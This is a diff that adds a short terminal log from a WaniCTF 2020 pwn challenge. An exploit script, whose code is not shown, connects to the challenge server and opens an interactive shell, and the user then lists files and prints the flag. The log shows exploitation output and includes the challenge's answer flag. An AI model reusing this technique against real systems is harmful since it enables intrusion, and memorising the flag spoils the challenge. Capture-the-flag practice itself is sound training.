@@ -1,0 +1,21 @@
+seth@pyramid:~/Desktop/ctf/wanictf-2020/pwn/pwn3$ python2 solvepwn3.py 
+[+] Opening connection to binsh.wanictf.org on port 9003: Done
+0x5592e1784010
+[*] Switching to interactive mode
+Please input "/bin/sh" address as a hex number: Your input address is 0x5592e1784020.
+Congratulation!
+$ cat flag
+cat: flag: No such file or directory
+$ ls
+chall
+flag.txt
+redir.sh
+$ cat flag.txt
+FLAG{cAn-f1nd-str1ng-us1ng-str1ngs}
+
+
+
+
+
+
+
